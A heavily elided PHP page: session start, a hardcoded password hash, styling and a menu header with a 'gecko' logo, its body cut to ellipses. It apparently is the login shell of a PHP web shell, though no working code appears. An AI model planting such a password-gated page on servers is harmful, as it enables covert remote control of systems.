<?php
session_start();
$password = "a8817675ee65103add657b24d7728bd7";
...
?>
    ...
    <style>
        body {
            ...
            align-items: center;
            background: url('https://i.postimg.cc/0QMN1dD1/b6b1184bcdcc252a5f326ab0128dbd52.jpg') no-repeat center center;
...
<body>
    <div class="menu-header">
        <ul>
            ...
            <li class="logo-gecko"><img width="400" height="400" src="https://revenges.pages.dev/revenges.jpg" align="right"></li>
